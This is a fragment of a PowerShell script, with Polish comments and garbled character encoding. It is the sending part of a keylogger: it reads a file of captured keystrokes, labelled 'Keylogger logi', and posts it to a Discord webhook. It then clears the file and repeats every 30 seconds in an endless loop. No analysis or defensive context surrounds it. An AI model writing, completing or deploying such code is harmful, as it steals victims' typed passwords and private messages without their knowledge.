            $content = Get-Content $logFile -Raw
            if ($content.Trim().Length -gt 0) {
                # Ograniczamy dÅ‚ugoÅ›Ä‡ wiadomoÅ›ci do 1900 znakÃ³w (limit Discorda to 2000)
                $maxLength = 1900
                if ($content.Length -gt $maxLength) {
                    $content = $content.Substring(0, $maxLength) + "`n[...]"
                }

                $payload = @{
                    "content" = "ğŸ“„ **Keylogger logi:**`n```\n$content\n```"
                } | ConvertTo-Json -Depth 10

                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'

                # Czyszczenie pliku po wysÅ‚aniu
                Clear-Content -Path $logFile
            }
        }
    } catch {
        Write-Host "âŒ BÅ‚Ä…d podczas wysyÅ‚ania do Discorda: $_"
    }
}

# GÅ‚Ã³wna pÄ™tla - wysyÅ‚anie co 30 sekund
while ($true) {
    Send-LogsToDiscord
    Start-Sleep -Seconds 30
}
